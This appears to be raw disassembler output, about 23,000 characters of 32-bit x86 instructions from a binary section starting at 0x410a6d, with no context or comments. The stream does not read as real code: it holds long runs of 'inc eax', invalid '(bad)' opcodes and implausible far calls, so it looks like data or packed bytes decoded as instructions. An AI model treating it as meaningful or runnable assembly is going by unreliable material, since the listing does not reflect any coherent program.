  410a6d:	stc    
  410a6e:	pusha  
  410a6f:	mov    edi,0x30885326
  410a74:	lahf   
  410a75:	inc    ebp
  410a76:	inc    eax
  410a77:	inc    eax
  410a78:	inc    eax
  410a79:	inc    eax
  410a7a:	inc    eax
  410a7b:	inc    eax
  410a7c:	inc    eax
  410a7d:	inc    eax
  410a7e:	inc    eax
  410a7f:	inc    eax
  410a80:	jb     0x410ae4
  410a82:	xchg   edx,eax
  410a83:	stos   BYTE PTR es:[edi],al
  410a84:	int    0xbc
  410a86:	das    
  410a87:	fadd   DWORD PTR [ecx+0x40]
  410a8a:	sbb    al,BYTE PTR [ebx+0x64]
  410a8d:	inc    edi
  410a8e:	fdiv   DWORD PTR [ecx-0x60]
  410a91:	dec    eax
  410a92:	nop
  410a93:	test   eax,0x497785bf
  410a98:	(bad)  
  410a9a:	bound  ebp,QWORD PTR [eax+0x404843a0]
  410aa0:	inc    eax
  410aa1:	inc    eax
  410aa2:	inc    eax
  410aa3:	inc    eax
  410aa4:	inc    eax
  410aa5:	rol    DWORD PTR [eax+0x40],0xd1
  410aa9:	inc    eax
  410aaa:	xor    al,ch
  410aac:	jo     0x410abb
  410aae:	nop
  410aaf:	jl     0x410a9e
  410ab1:	xchg   esp,eax
  410ab2:	jg     0x410a9c
  410ab4:	xchg   ecx,eax
  410ab5:	retf   
  410ab6:	leave  
  410ab7:	packsswb mm2,QWORD PTR [ecx+ebp*2]
  410abb:	lea    esp,[esi+0x22]
  410abe:	inc    ebx
  410abf:	cmovo  eax,DWORD PTR [eax+0x0]
  410ac3:	inc    eax
  410ac4:	inc    eax
  410ac5:	inc    eax
  410ac6:	inc    eax
  410ac7:	inc    eax
  410ac8:	inc    eax
  410ac9:	mov    cl,0x4d
  410acb:	sbb    ah,BYTE PTR [bp-0x2ec9]
  410ad0:	xchg   ebx,eax
  410ad1:	dec    ecx
  410ad2:	mov    ds:0x435390fc,al
  410ad7:	mov    bh,0x37
  410ad9:	icebp  
  410ada:	push   ebp
  410adb:	bound  esp,QWORD PTR [edx-0x47]
  410ade:	dec    esi
  410adf:	frndint 
  410ae1:	pop    ebx
  410ae2:	mov    edi,0xc6a47d44
  410ae7:	add    dh,al
  410ae9:	push   ecx
  410aea:	jb     0x410ae4
  410aec:	mov    eax,0x40aa6853
  410af1:	inc    eax
  410af2:	inc    eax
  410af3:	inc    eax
  410af4:	inc    eax
  410af5:	inc    eax
  410af6:	inc    eax
  410af7:	inc    eax
  410af8:	inc    eax
  410af9:	inc    eax
  410afa:	cmc    
  410afb:	ins    BYTE PTR es:[edi],dx
  410afc:	push   ebp
  410afd:	sbb    bh,BYTE PTR [bx+di+0x4164]
  410b02:	jo     0x410a95
  410b04:	mov    bh,0xd2
  410b06:	nop
  410b07:	mov    ds:0x4c5c4360,al
  410b0c:	push   edx
  410b0d:	hlt    
  410b0e:	bound  eax,QWORD PTR [ebx-0x58]
  410b11:	xor    BYTE PTR [edi+0x40404040],cl
  410b17:	inc    eax
  410b18:	inc    eax
  410b19:	int3   
  410b1a:	jne    0x410b5c
  410b1c:	adc    esi,DWORD PTR [ecx-0x191632fb]
  410b22:	mov    eax,0x4150503a
  410b27:	sub    esi,DWORD PTR [edx+eax*1]
  410b2a:	inc    edi
  410b2b:	mov    WORD PTR [ecx-0x56a729e],ss
  410b31:	bound  eax,QWORD PTR [ebp-0x3effbfc8]
  410b37:	inc    eax
  410b38:	inc    eax
  410b39:	inc    eax
  410b3a:	inc    eax
  410b3b:	add    BYTE PTR [eax+0x4c],al
  410b3e:	outs   dx,DWORD PTR ds:[esi]
  410b3f:	inc    ebp
  410b40:	sbb    ah,BYTE PTR [eax+0x7b4243a0]
  410b46:	cs gs nop
  410b49:	inc    esi
  410b4a:	adc    eax,0xf597490
  410b4f:	xor    eax,0xe6c9ab62
  410b54:	mov    edx,DWORD PTR [ecx]
  410b56:	mov    ds:0xbc9e5553,al
  410b5b:	inc    ebx
  410b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b5d:	mov    edi,0x40408021
  410b62:	inc    eax
  410b63:	inc    eax
  410b64:	inc    eax
  410b65:	inc    eax
  410b66:	inc    eax
  410b67:	inc    eax
  410b68:	inc    DWORD PTR [eax-0x4c]
  410b6b:	add    eax,0x463dd115
  410b70:	adc    edx,DWORD PTR [ecx+0x1a]
  410b73:	mov    al,ds:0x517e76f6
  410b78:	popa   
  410b79:	test   al,0x90
  410b7b:	adc    cl,BYTE PTR [edi-0x29]
  410b7e:	jbe    0x410bcc
  410b80:	inc    edi
  410b81:	adc    DWORD PTR [eax+0x40],eax
  410b84:	inc    eax
  410b85:	inc    eax
  410b86:	inc    eax
  410b87:	inc    eax
  410b88:	inc    eax
  410b89:	inc    eax
  410b8a:	inc    eax
  410b8b:	inc    eax
  410b8c:	bound  edx,QWORD PTR [edx+edi*1+0x4]
  410b90:	les    ebx,FWORD PTR [ecx]
  410b92:	mov    ecx,0x34f80efb
  410b97:	mov    ebx,0x977643ef
  410b9c:	mov    al,0x9c
  410b9e:	inc    esi
  410b9f:	inc    ecx
  410ba0:	std    
  410ba1:	fwait
  410ba2:	loop   0x410bf6
  410ba4:	sbb    dl,BYTE PTR ds:0x41ab4345
  410baa:	sub    esp,eax
  410bac:	nop
  410bad:	inc    ecx
  410bae:	aam    0x30
  410bb0:	mov    bl,0xd5
  410bb2:	inc    eax
  410bb3:	mov    ah,0x40
  410bb5:	inc    eax
  410bb6:	inc    eax
  410bb7:	inc    eax
  410bb8:	inc    eax
  410bb9:	inc    eax
  410bba:	inc    eax
  410bbb:	inc    eax
  410bbc:	add    BYTE PTR [edx-0x3d],ah
  410bbf:	addr16 mov ah,0xe8
  410bc2:	jne    0x410bf2
  410bc4:	bound  ebx,QWORD PTR [edx+0x60]
  410bc7:	inc    edx
  410bc8:	dec    esi
  410bc9:	int    0xf0
  410bcb:	clc    
  410bcc:	dec    esp
  410bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bce:	cli    
  410bcf:	aam    0x8d
  410bd1:	cmp    eax,0x1a1e057a
  410bd6:	call   0x31a1:0xda434370
  410bdd:	nop
  410bde:	or     eax,0x407790f0
  410be3:	inc    eax
  410be4:	inc    eax
  410be5:	inc    eax
  410be6:	inc    eax
  410be7:	inc    eax
  410be8:	and    eax,0x31404040
  410bed:	dec    ecx
  410bee:	mov    al,0x62
  410bf0:	inc    ecx
  410bf1:	stos   DWORD PTR es:[edi],eax
  410bf2:	and    ecx,0x57
  410bf5:	and    BYTE PTR ds:0x4e424144,cl
  410bfb:	fs push edx
  410bfd:	pop    ds
  410bfe:	push   cs
  410bff:	lods   al,BYTE PTR ds:[esi]
  410c00:	shr    BYTE PTR [ebx+0x45bbb5cd],0x32
  410c07:	sbb    ch,BYTE PTR [ebx]
  410c09:	inc    edx
  410c0a:	retf   
  410c0b:	pop    ecx
  410c0c:	inc    eax
  410c0d:	inc    eax
  410c0e:	inc    eax
  410c0f:	inc    eax
  410c10:	inc    eax
  410c11:	inc    eax
  410c12:	inc    eax
  410c13:	inc    eax
  410c14:	inc    eax
  410c15:	inc    eax
  410c16:	and    al,0xa2
  410c18:	bound  edx,QWORD PTR [eax+0x182abf9]
  410c1e:	or     esi,DWORD PTR [eax+edx*2]
  410c21:	bound  ebx,QWORD PTR [eax+0x31e72458]
  410c27:	push   esp
  410c28:	sub    edx,ebp
  410c2a:	add    eax,0x423a25ab
  410c2f:	and    bl,BYTE PTR [ecx]
  410c31:	inc    ecx
  410c32:	inc    ecx
  410c33:	pop    edx
  410c34:	inc    eax
  410c35:	inc    eax
  410c36:	inc    eax
  410c37:	inc    eax
  410c38:	inc    eax
  410c39:	inc    eax
  410c3a:	rol    DWORD PTR [eax+0x40],0x41
  410c3e:	fidiv  WORD PTR [ecx+0x32]
  410c41:	in     ax,dx
  410c43:	inc    ebp
  410c44:	stos   DWORD PTR es:[edi],eax
  410c45:	inc    ebx
  410c46:	mov    al,0x7b
  410c48:	inc    esi
  410c49:	push   esp
  410c4a:	dec    esp
  410c4b:	les    eax,FWORD PTR [esi+0x30]
  410c4e:	mov    al,0xd0
  410c50:	pusha  
  410c51:	bound  esi,QWORD PTR [ebp*2+0x3057b035]
  410c58:	xchg   ebp,eax
  410c59:	shr    DWORD PTR [eax-0x8],1
  410c5c:	dec    ecx
  410c5d:	inc    edi
  410c5e:	stos   DWORD PTR es:[edi],eax
  410c5f:	or     DWORD PTR [esi+edx*4],esi
  410c62:	pop    edx
  410c63:	inc    eax
  410c64:	inc    eax
  410c65:	add    BYTE PTR [eax+0x40],al
  410c68:	inc    eax
  410c69:	inc    eax
  410c6a:	inc    eax
  410c6b:	inc    eax
  410c6c:	xchg   esi,eax
  410c6d:	imul   eax,DWORD PTR [ebp+0x510090aa],0xffffff85
  410c74:	fwait
  410c75:	in     al,dx
  410c76:	inc    ebx
  410c77:	lea    edi,[edx-0x5f]
  410c7a:	cmp    ecx,edi
  410c7c:	add    ebx,DWORD PTR [ecx-0x70]
  410c7f:	inc    BYTE PTR [ebx+eax*2-0x48]
  410c83:	sbb    al,BYTE PTR [eax+0x40]
  410c86:	inc    eax
  410c87:	inc    eax
  410c88:	inc    eax
  410c89:	inc    eax
  410c8a:	inc    eax
  410c8b:	inc    eax
  410c8c:	inc    eax
  410c8d:	inc    eax
  410c8e:	push   ebx
  410c8f:	in     al,0xa0
  410c91:	jge    0x410c63
  410c93:	pusha  
  410c94:	gs xchg ecx,eax
  410c96:	xchg   esp,eax
  410c97:	push   ecx
  410c98:	sbb    dh,BYTE PTR [ebp+esi*1+0x6f62e50e]
  410c9f:	pop    ecx
  410ca0:	icebp  
  410ca1:	(bad)  
  410ca2:	xor    al,0x40
  410ca4:	inc    eax
  410ca5:	inc    eax
  410ca6:	inc    eax
  410ca7:	inc    eax
  410ca8:	inc    eax
  410ca9:	int3   
  410caa:	jne    0x410cec
  410cac:	inc    eax
  410cad:	ins    DWORD PTR es:[edi],dx
  410cae:	pop    edx
  410caf:	fxch   st(1)
  410cb1:	cmp    DWORD PTR [esi+0x41],edx
  410cb4:	or     esp,ebx
  410cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cb7:	pop    sp
  410cb9:	popf   
  410cba:	shl    BYTE PTR [edx],0x55
  410cbd:	bound  ebx,QWORD PTR [edx]
  410cbf:	xchg   edx,eax
  410cc0:	xor    eax,0x40c10040
  410cc5:	inc    eax
  410cc6:	inc    eax
  410cc7:	inc    eax
  410cc8:	add    BYTE PTR [eax+0x17],al
  410ccb:	in     eax,0x37
  410ccd:	pusha  
  410cce:	push   0x43f40590
  410cd3:	sbb    eax,0x629c0d42
  410cd8:	leave  
  410cd9:	add    eax,0x223f5a33
  410cde:	bound  eax,QWORD PTR [ebx+0x26]
  410ce1:	jnp    0x410c8f
  410ce3:	repz rol BYTE PTR [eax+0x1f],1
  410ce7:	add    al,0x41
  410ce9:	clc    
  410cea:	inc    ebx
  410ceb:	fwait
  410cec:	jno    0x410d0d
  410cee:	add    BYTE PTR [eax+0x40],0x40
  410cf2:	inc    eax
  410cf3:	inc    eax
  410cf4:	inc    eax
  410cf5:	inc    eax
  410cf6:	inc    eax
  410cf7:	inc    DWORD PTR [eax+0x6c]
  410cfa:	ret    0xdd05
  410cfd:	adc    eax,0x420941e3
  410d02:	pusha  
  410d03:	retf   
  410d04:	imul   eax,DWORD PTR [eax-0x6c],0x60
  410d08:	nop
  410d09:	cmp    eax,0xdda14552
  410d0e:	jp     0x410d13
  410d10:	sbb    DWORD PTR [eax+0x40],eax
  410d13:	inc    eax
  410d14:	inc    eax
  410d15:	inc    eax
  410d16:	inc    eax
  410d17:	inc    eax
  410d18:	inc    eax
  410d19:	inc    eax
  410d1a:	inc    eax
  410d1b:	cmc    
  410d1c:	clc    
  410d1d:	loop   0x410cdc
  410d1f:	fwait
  410d20:	inc    edi
  410d21:	and    al,0x68
  410d23:	daa    
  410d24:	nop
  410d25:	adc    BYTE PTR [eax-0x23],ah
  410d28:	aaa    
  410d29:	pusha  
  410d2a:	sub    eax,0x40404040
  410d2f:	inc    eax
  410d30:	inc    eax
  410d31:	inc    eax
  410d32:	inc    eax
  410d33:	add    BYTE PTR [ecx-0x330d9890],ch
  410d39:	sbb    eax,0x46bce516
  410d3e:	hlt    
  410d3f:	ja     0x410d4f
  410d41:	add    eax,DWORD PTR [eax+0x38]
  410d44:	or     eax,0xe7660d66
  410d49:	adc    DWORD PTR [edx],edx
  410d4b:	arpl   WORD PTR [ecx+0x40],ax
  410d4e:	inc    eax
  410d4f:	inc    eax
  410d50:	inc    eax
  410d51:	inc    eax
  410d52:	inc    eax
  410d53:	and    eax,0x8e404040
  410d58:	leave  
  410d59:	add    ebp,DWORD PTR [esi]
  410d5b:	jmp    0x410dc5
  410d5d:	shl    BYTE PTR [eax],cl
  410d5f:	inc    esi
  410d60:	mov    ch,0x43
  410d62:	xor    dh,dh
  410d64:	inc    eax
  410d65:	test   al,0xf8
  410d67:	cmc    
  410d68:	or     eax,0x5224333
  410d6d:	inc    ecx
  410d6e:	arpl   WORD PTR [esi-0xa],bp
  410d71:	test   al,0xbb
  410d73:	inc    ebx
  410d74:	pop    ecx
  410d75:	sub    al,BYTE PTR [ebp-0x7]
  410d78:	dec    edi
  410d79:	inc    eax
  410d7a:	inc    eax
  410d7b:	inc    eax
  410d7c:	inc    eax
  410d7d:	inc    eax
  410d7e:	inc    eax
  410d7f:	inc    eax
  410d80:	inc    eax
  410d81:	inc    eax
  410d82:	inc    eax
  410d83:	inc    edi
  410d84:	out    0x31,eax
  410d86:	pusha  
  410d87:	inc    ecx
  410d88:	int3   
  410d89:	mov    eax,?
  410d8b:	test   DWORD PTR [ebp+0x24],eax
  410d8e:	gs dec esp
  410d90:	int    0x6e
  410d92:	add    eax,0x7b335243
  410d97:	and    al,0x40
  410d99:	or     ecx,0xffffff90
  410d9c:	retf   0x404a
  410d9f:	inc    eax
  410da0:	inc    eax
  410da1:	inc    eax
  410da2:	inc    eax
  410da3:	inc    eax
  410da4:	rol    DWORD PTR [eax+0x40],0x62
  410da8:	je     0x410d2c
  410daa:	inc    dx
  410dac:	pop    edx
  410dad:	push   esi
  410dae:	jo     0x410dd6
  410db0:	sahf   
  410db1:	inc    edx
  410db2:	mov    dh,dh
  410db4:	fs cs aaa 
  410db7:	dec    eax
  410db8:	jo     0x410dc6
  410dba:	pushf  
  410dbb:	dec    edi
  410dbc:	in     eax,0x20
  410dbe:	inc    ebx
  410dbf:	jecxz  0x410e23
  410dc1:	aam    0x59
  410dc3:	test   al,0xe2
  410dc5:	xor    BYTE PTR [eax],0x41
  410dc8:	inc    eax
  410dc9:	inc    eax
  410dca:	add    BYTE PTR [eax+0x40],al
  410dcd:	inc    eax
  410dce:	inc    eax
  410dcf:	inc    eax
  410dd0:	inc    eax
  410dd1:	test   eax,0x794b561a
  410dd6:	xchg   ebx,eax
  410dd7:	popf   
  410dd8:	mov    al,ds:0xc8883cb1
  410ddd:	pop    ebx
  410dde:	inc    ecx
  410ddf:	and    al,0x6b
  410de1:	in     eax,0x64
  410de3:	imul   eax,esp,0x40401343
  410de9:	inc    eax
  410dea:	inc    eax
  410deb:	inc    eax
  410dec:	inc    eax
  410ded:	inc    eax
  410dee:	inc    eax
  410def:	inc    eax
  410df0:	inc    eax
  410df1:	mov    edx,db4
  410df4:	pop    edx
  410df5:	mov    ebp,0x12243362
  410dfa:	inc    ecx
  410dfb:	inc    ecx
  410dfc:	xor    al,0x86
  410dfe:	nop
  410dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e00:	imul   DWORD PTR [edi]
  410e02:	pusha  
  410e03:	mov    esp,0x470d051a
  410e08:	sub    al,0x42
  410e0a:	outs   dx,BYTE PTR ds:[esi]
  410e0b:	push   0x857bc9c8
  410e10:	data16 shl BYTE PTR [edx+0x35],cl
  410e14:	arpl   WORD PTR [esi],sp
  410e16:	test   al,0x40
  410e18:	inc    eax
  410e19:	inc    eax
  410e1a:	inc    eax
  410e1b:	inc    eax
  410e1c:	inc    eax
  410e1d:	int3   
  410e1e:	jne    0x410e60
  410e20:	inc    ebx
  410e21:	sub    esp,DWORD PTR ds:[eax-0x44]
  410e25:	inc    edx
  410e26:	inc    ecx
  410e27:	or     eax,0x7e40ca90
  410e2c:	addr16 cld 
  410e2e:	fcmovne st,st(3)
  410e30:	ja     0x410e75
  410e32:	and    edi,DWORD PTR [edi+0x4f]
  410e35:	sbb    bh,BYTE PTR [eax+ebp*4]
  410e38:	inc    ebx
  410e39:	push   ebp
  410e3a:	imul   esp,DWORD PTR [ecx+0x446ec8dc],0xffffffd1
  410e41:	call   0x4014:0x63fa6913
  410e48:	add    cl,al
  410e4a:	inc    eax
  410e4b:	inc    eax
  410e4c:	inc    eax
  410e4d:	inc    eax
  410e4e:	add    BYTE PTR [eax+0x6e],al
  410e51:	inc    edx
  410e52:	scas   al,BYTE PTR es:[edi]
  410e53:	adc    DWORD PTR [edi+0xc],ebp
  410e56:	je     0x410ec1
  410e58:	ror    ch,1
  410e5a:	dec    eax
  410e5b:	inc    edx
  410e5c:	inc    ebx
  410e5d:	mov    BYTE PTR fs:0xf4c55da8,cl
  410e64:	mov    ds:0x26684841,al
  410e69:	jo     0x410eba
  410e6b:	and    dl,BYTE PTR [edi]
  410e6d:	mov    WORD PTR [eax+0x40],es
  410e70:	inc    eax
  410e71:	inc    eax
  410e72:	inc    eax
  410e73:	inc    eax
  410e74:	inc    eax
  410e75:	inc    eax
  410e76:	inc    DWORD PTR [eax+0x3c]
  410e79:	fld    st(5)
  410e7b:	inc    ecx
  410e7c:	cmp    BYTE PTR [esp+edi*2-0x16],0x5a
  410e81:	bound  eax,QWORD PTR ss:[ebx+0x2e]
  410e85:	mov    cl,0x66
  410e87:	push   edx
  410e88:	int    0xf9
  410e8a:	mov    ch,0x30
  410e8c:	test   eax,0x7ef16d42
  410e91:	adc    BYTE PTR ds:0x653223a0,0x41
  410e98:	cli    
  410e99:	outs   dx,DWORD PTR ds:[esi]
  410e9a:	enter  0xd247,0x3d
  410e9e:	loop   0x410ee0
  410ea0:	inc    eax
  410ea1:	inc    eax
  410ea2:	inc    eax
  410ea3:	inc    eax
  410ea4:	inc    eax
  410ea5:	inc    eax
  410ea6:	inc    eax
  410ea7:	inc    eax
  410ea8:	inc    eax
  410ea9:	cmp    BYTE PTR [ebx+ebx*8-0x42],al
  410ead:	test   DWORD PTR [eax],eax
  410eaf:	inc    ecx
  410eb0:	jp     0x410eb7
  410eb2:	sub    al,0x66
  410eb4:	mov    ds:0x40400443,al
  410eb9:	inc    eax
  410eba:	inc    eax
  410ebb:	inc    eax
  410ebc:	inc    eax
  410ebd:	inc    eax
  410ebe:	inc    eax
  410ebf:	add    al,dl
  410ec1:	inc    edi
  410ec2:	neg    BYTE PTR [eax+0x25]
  410ec5:	ret    
  410ec6:	nop
  410ec7:	sar    BYTE PTR [ebx+0x21],cl
  410eca:	test   al,0x74
  410ecc:	mov    BYTE PTR [ebp+0x40404014],dh
  410ed2:	inc    eax
  410ed3:	inc    eax
  410ed4:	inc    eax
  410ed5:	and    eax,0xda404040
  410eda:	inc    eax
  410edb:	inc    esp
  410edc:	adc    BYTE PTR [ecx+0x20431500],ch
  410ee2:	hlt    
  410ee3:	and    edi,DWORD PTR [edx+ecx*4+0x4ed1f669]
  410eea:	cs ins BYTE PTR es:[edi],dx
  410eec:	inc    edx
  410eed:	(bad)  
  410eef:	dec    edi
  410ef0:	std    
  410ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ef2:	(bad)  
  410ef3:	loope  0x410f35
  410ef5:	inc    eax
  410ef6:	inc    eax
  410ef7:	inc    eax
  410ef8:	inc    eax
  410ef9:	inc    eax
  410efa:	inc    eax
  410efb:	inc    eax
  410efc:	inc    eax
  410efd:	inc    eax
  410efe:	mov    ah,0x62
  410f00:	cmp    dl,BYTE PTR [eax+0x5291dff4]
  410f06:	shr    BYTE PTR [eax-0x30],1
  410f09:	or     eax,0xa33d140b
  410f0e:	arpl   WORD PTR [eax-0x7fbd369a],sp
  410f14:	push   ecx
  410f15:	das    
  410f16:	pop    eax
  410f17:	push   ds
  410f18:	dec    edx
  410f19:	inc    eax
  410f1a:	inc    eax
  410f1b:	inc    eax
  410f1c:	inc    eax
  410f1d:	inc    eax
  410f1e:	inc    eax
  410f1f:	rol    DWORD PTR [eax+0x40],0x58
  410f23:	inc    ecx
  410f24:	push   ds
  410f25:	jge    0x410f81
  410f27:	push   edi
  410f28:	je     0x410f62
  410f2a:	dec    ebx
  410f2b:	inc    ebx
  410f2c:	stos   BYTE PTR es:[edi],al
  410f2d:	push   ecx
  410f2e:	arpl   WORD PTR [ecx],di
  410f30:	inc    eax
  410f31:	inc    eax
  410f32:	add    BYTE PTR [eax+0x40],al
  410f35:	inc    eax
  410f36:	inc    eax
  410f37:	inc    eax
  410f38:	inc    eax
  410f39:	bound  edx,QWORD PTR [eax+0x6f263018]
  410f3f:	push   ebx
  410f40:	(bad)  
  410f41:	je     0x410efd
  410f43:	rcr    BYTE PTR [eax+edi*8-0x775a1caf],0x7b
  410f4b:	inc    eax
  410f4c:	inc    edi
  410f4d:	adc    esp,DWORD PTR [ecx]
  410f4f:	add    al,0xa8
  410f51:	dec    eax
  410f52:	add    al,BYTE PTR [ecx]
  410f54:	test   eax,eax
  410f56:	aam    0x64
  410f58:	inc    edx
  410f59:	cmp    al,0x40
  410f5b:	inc    eax
  410f5c:	inc    eax
  410f5d:	inc    eax
  410f5e:	inc    eax
  410f5f:	inc    eax
  410f60:	inc    eax
  410f61:	inc    eax
  410f62:	inc    eax
  410f63:	inc    eax
  410f64:	(bad)  
  410f65:	mov    BYTE PTR [ebx-0x5f],0x3b
  410f69:	xor    al,0x2a
  410f6b:	push   edx
  410f6c:	ja     0x410f47
  410f6e:	nop
  410f6f:	ins    DWORD PTR es:[edi],dx
  410f70:	push   ebp
  410f71:	adc    edx,DWORD PTR [edx]
  410f73:	inc    eax
  410f74:	inc    eax
  410f75:	inc    eax
  410f76:	inc    eax
  410f77:	inc    eax
  410f78:	inc    eax
  410f79:	int3   
  410f7a:	jne    0x410fbc
  410f7c:	lds    edi,FWORD PTR [eax]
  410f7e:	test   al,0x31
  410f80:	adc    eax,0x54bca1d1
  410f85:	inc    ecx
  410f86:	add    eax,0x313d6243
  410f8b:	inc    esp
  410f8c:	xchg   esi,eax
  410f8d:	xor    BYTE PTR [edi+0x60413cd1],al
  410f93:	inc    eax
  410f94:	add    cl,al
  410f96:	inc    eax
  410f97:	inc    eax
  410f98:	inc    eax
  410f99:	inc    eax
  410f9a:	add    BYTE PTR [eax+0x30],al
  410f9d:	sbb    eax,0x68d45a67
  410fa2:	pop    eax
  410fa3:	sub    BYTE PTR es:[eax+ebp*4-0x55],ch
  410fa8:	popf   
  410fa9:	add    eax,0x62714339
  410fae:	adc    BYTE PTR [eax-0x1d9f50ff],dl
  410fb4:	xor    al,0x74
  410fb6:	or     al,BYTE PTR [eax+0x40]
  410fb9:	inc    eax
  410fba:	inc    eax
  410fbb:	inc    eax
  410fbc:	inc    eax
  410fbd:	inc    eax
  410fbe:	inc    eax
  410fbf:	inc    DWORD PTR [eax+0x5]
  410fc2:	call   0xcf88:0x52adf150
  410fc9:	leave  
  410fca:	inc    ecx
  410fcb:	outs   dx,BYTE PTR ds:[esi]
  410fcc:	inc    ebx
  410fcd:	es push 0x36
  410fd0:	fs push edx
  410fd2:	inc    ebx
  410fd3:	nop
  410fd4:	adc    ebx,DWORD PTR [edx+0x64]
  410fd7:	and    al,0x41
  410fd9:	xor    BYTE PTR [eax],0x42
  410fdc:	inc    edx
  410fdd:	loope  0x411043
  410fdf:	inc    eax
  410fe0:	inc    eax
  410fe1:	inc    eax
  410fe2:	inc    eax
  410fe3:	inc    eax
  410fe4:	inc    eax
  410fe5:	inc    eax
  410fe6:	inc    eax
  410fe7:	inc    eax
  410fe8:	inc    eax
  410fe9:	dec    esi
  410fea:	xor    al,0xc3
  410fec:	cwde   
  410fed:	and    eax,0x5a434577
  410ff2:	je     0x410f9c
  410ff4:	inc    edi
  410ff5:	jl     0x41106c
  410ff7:	popa   
  410ff8:	sub    dh,BYTE PTR [ecx-0x387afa58]
  410ffe:	jno    0x41102e
  411000:	ja     0x41101d
  411002:	adc    DWORD PTR [eax+0x40],eax
  411005:	inc    eax
  411006:	inc    eax
  411007:	inc    eax
  411008:	inc    eax
  411009:	inc    eax
  41100a:	inc    eax
  41100b:	add    bl,cl
  41100d:	inc    ebx
  41100e:	scas   al,BYTE PTR es:[edi]
  41100f:	inc    edx
  411010:	arpl   WORD PTR [ebx+0xc],ax
  411013:	mov    ah,0x40
  411015:	nop
  411016:	dec    edx
  411017:	push   eax
  411018:	push   esi
  411019:	inc    ebx
  41101a:	bound  eax,QWORD PTR [ecx+0x1]
  41101d:	into   
  41101e:	or     ch,BYTE PTR [edx+eax*4]
  411021:	addr16 inc ebx
  411023:	repnz mov BYTE PTR [ebx+0x52],0xfe
  411028:	and    al,0x55
  41102a:	adc    BYTE PTR [eax-0xf],ch
  41102d:	rol    DWORD PTR [eax+0x40],1
  411030:	inc    eax
  411031:	inc    eax
  411032:	inc    eax
  411033:	inc    eax
  411034:	and    eax,0x98404040
  411039:	dec    edx
  41103a:	ins    DWORD PTR es:[edi],dx
  41103b:	test   al,0x69
  41103d:	bound  ebp,QWORD PTR [eax-0x7e4dbcbb]
  411043:	inc    ecx
  411044:	dec    edx
  411045:	xor    BYTE PTR ds:0x68170586,al
  41104b:	sub    dl,ch
  41104d:	jns    0x41108f
  41104f:	inc    eax
  411050:	inc    eax
  411051:	inc    eax
  411052:	inc    eax
  411053:	inc    eax
  411054:	inc    eax
  411055:	inc    eax
  411056:	inc    eax
  411057:	inc    eax
  411058:	xchg   DWORD PTR [esi],ecx
  41105a:	outs   dx,BYTE PTR gs:[esi]
  41105c:	add    al,BYTE PTR [ecx+0x63]
  41105f:	sub    DWORD PTR [edx-0x1e],edx
  411062:	shl    BYTE PTR [edx+0x3b],1
  411065:	xchg   ebx,eax
  411066:	out    0x24,al
  411068:	xor    al,0x41
  41106a:	out    0x30,eax
  41106c:	sub    DWORD PTR [eax],edi
  41106e:	add    dl,BYTE PTR gs:[edx+0x306aaa43]
  411075:	inc    esi
  411076:	sbb    ebx,edx
  411078:	lds    esi,FWORD PTR [eax]
  41107a:	or     edx,eax
  41107c:	inc    eax
  41107d:	inc    eax
  41107e:	inc    eax
  41107f:	inc    eax
  411080:	inc    eax
  411081:	inc    eax
  411082:	rol    DWORD PTR [eax+0x40],0x3
  411086:	and    BYTE PTR fs:[edx+0x47],dh
  41108a:	xchg   esp,eax
  41108b:	iret   
  41108c:	xor    ch,BYTE PTR [esi+0x11626367]
  411092:	inc    edi
  411093:	pop    ss
  411094:	inc    ebx
  411095:	or     eax,DWORD PTR [ebp+0x40]
  411098:	inc    eax
  411099:	add    BYTE PTR [eax+0x40],al
  41109c:	inc    eax
  41109d:	inc    eax
  41109e:	inc    eax
  41109f:	inc    eax
  4110a0:	jne    0x411099
  4110a2:	test   BYTE PTR [ebp-0x3f4a2fd2],0x80
  4110a9:	xor    BYTE PTR [edi+0x43],cl
  4110ac:	leave  
  4110ad:	jle    0x4110b4
  4110af:	addr16 fs xor eax,0xeae9904c
  4110b6:	pop    eax
  4110b7:	push   ds
  4110b8:	outs   dx,DWORD PTR ds:[esi]
  4110b9:	inc    eax
  4110ba:	inc    eax
  4110bb:	inc    eax
  4110bc:	inc    eax
  4110bd:	inc    eax
  4110be:	inc    eax
  4110bf:	inc    eax
  4110c0:	inc    eax
  4110c1:	inc    eax
  4110c2:	inc    eax
  4110c3:	inc    eax
  4110c4:	or     eax,0x27949eb
  4110c9:	stos   DWORD PTR es:[edi],eax
  4110ca:	cmp    BYTE PTR [eax],ch
  4110cc:	retf   
  4110cd:	inc    ebx
  4110ce:	adc    edx,esi
  4110d0:	and    eax,0xb53a46b4
  4110d5:	rcl    ecx,1
  4110d7:	xor    al,0xd1
  4110d9:	add    eax,0x5d050556
  4110de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110df:	inc    esp
  4110e0:	add    al,0xcb
  4110e2:	inc    eax
  4110e3:	inc    eax
  4110e4:	inc    eax
  4110e5:	inc    eax
  4110e6:	inc    eax
  4110e7:	inc    eax
  4110e8:	int3   
  4110e9:	jne    0x41112b
  4110eb:	mov    eax,ds:0x68bc8c9
  4110f0:	jb     0x411105
  4110f2:	inc    ebp
  4110f3:	sbb    eax,0x2691bc4c
  4110f8:	jl     0x411134
  4110fa:	inc    ebx
  4110fb:	inc    eax
  4110fc:	add    cl,al
  4110fe:	inc    eax
  4110ff:	inc    eax
  411100:	inc    eax
  411101:	inc    eax
  411102:	add    BYTE PTR [eax-0x58],al
  411105:	out    0x5,al
  411107:	pop    es
  411108:	xchg   esp,eax
  411109:	inc    ecx
  41110a:	jno    0x411181
  41110c:	arpl   WORD PTR [edi-0x36],ax
  41110f:	inc    ecx
  411110:	sub    al,0xd2
  411112:	add    ah,bh
  411114:	or     esp,DWORD PTR [ebx+0x40]
  411117:	inc    ebx
  411118:	fnstsw WORD PTR [esi+0x22]
  41111b:	or     ah,al
  41111d:	leave  
  41111e:	inc    eax
  41111f:	xor    BYTE PTR [esi],dh
  411121:	jo     0x411112
  411123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411124:	ss cmp eax,0xd6629040
  41112a:	inc    eax
  41112b:	inc    eax
  41112c:	inc    eax
  41112d:	inc    eax
  41112e:	inc    eax
  41112f:	inc    eax
  411130:	inc    eax
  411131:	inc    eax
  411132:	inc    DWORD PTR [eax+0x1]
